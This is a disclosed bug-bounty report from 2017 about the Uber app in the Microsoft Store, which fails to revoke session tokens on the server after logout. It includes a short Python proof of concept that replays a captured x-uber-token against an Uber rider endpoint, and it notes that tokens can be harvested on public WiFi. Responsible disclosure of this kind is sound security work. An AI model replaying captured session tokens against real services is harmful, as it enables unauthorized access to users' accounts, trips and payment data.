# The Microsoft Store Uber App Does Not Implement Server-side Token Revocation

## Report Details
- **Report ID**: 293363
- **URL**: https://hackerone.com/reports/293363
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-11-28T03:54:00.571Z
- **Disclosed**: 2017-12-24T20:16:44.836Z

## Reporter
- **Username**: gregoryvperry
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
## Summary
The Microsoft Store Uber App (Windows Phone Architecture) does not properly revoke or expire a rider's x-uber-token upon app signout.

## Security Impact
When a user logs out/signs off of the app, the logout process is handled only locally on the application side, and without any type of x-uber-token revocation or expiration at the Uber customer endpoint. This results in the x-uber-token still being active even after a user has logged out, giving an attacker the ability to access and/or modify all aspects of an Uber Rider's (and potentially Driver's) customer information.

## Reproduction Steps
1. Login using the Microsoft Store Uber App with an interception proxy to capture the session data. Make a note of the issued x-uber-token.
2. Logout of the Microsoft Store Uber App.
3. Using the Python POC code below, gain access to the Rider Dispatch View using the x-uber-token issued from Step 1 above:

-----

import requests

response = requests.get(
    'https://cn-sjc1.uber.com/rt/riders/1ad0f5c1-1ac0-4c2c-a34a-36f267d7ae6f/dispatch-view',
    headers={                                                                      'accept-encoding': 'gzip, '
                                                                                              'deflate',
                                                                           'accept-language': 'en; '
                                                                                              'q=1.0, '
                                                                                              'fr; '
                                                                                              'q=0.9, '
                                                                                              'de; '
                                                                                              'q=0.8, '
                                                                                              'zh-Hans; '
                                                                                              'q=0.7, '
                                                                                              'zh-Hant; '
                                                                                              'q=0.6, '
                                                                                              'ja; '
                                                                                              'q=0.5',
                                                                           'charset': 'utf-8',
                                                                           'user-agent': 'client/windows-phone/0.0.0.',
                                                                           'x-uber-client-name': 'client',
                                                                           'x-uber-client-version': '6.2.8',
                                                                           'x-uber-device': 'windows-phone',
                                                                           'x-uber-device-epoch': '1511637222701',
                                                                           'x-uber-device-language': 'en',
                                                                           'x-uber-device-location-altitude': '100',
                                                                           'x-uber-device-location-latitude': '37.4291076516301',
                                                                           'x-uber-device-location-longitude': '-77.5513191759734',
                                                                           'x-uber-device-model': 'LENOVO '
                                                                                                  '80TJ',
                                                                           'x-uber-device-os': '10.0.16299',
                                                                           'x-uber-token': '5ead9f1ab28780d48f8caa9d41a22973'}
)

print(response.text)

-----

## Specifics
* GregPerry804@gmail.com was the account used for this attack.
* All Uber customer endpoints used by the Microsoft Store Uber App will still accept a x-uber-token as valid, after the user has signed off/logged out of their Microsoft Store Uber App session.

## Impact

An attacker with access to a previously used x-uber-token, even after the user has logged out of the Microsoft Store Uber App, can still modify a rider's profile, access previous trip histories, schedule and/or cancel Uber driver dispatches, and access and/or modify stored payment information.

Driver functionality was not tested. If the Uber Driver role is also implemented within the Microsoft Phone Architecture Uber App, then all functionality encapsulated within the app as relates to driver functionality could be observed and/or modified as well.

Given the lack of certificate pinning in the Microsoft Store Uber App, this vulnerability is not theoretical and with x-uber-tokens easily harvested at public WiFi hotspots where the app is being used.

## Attachments
No attachments
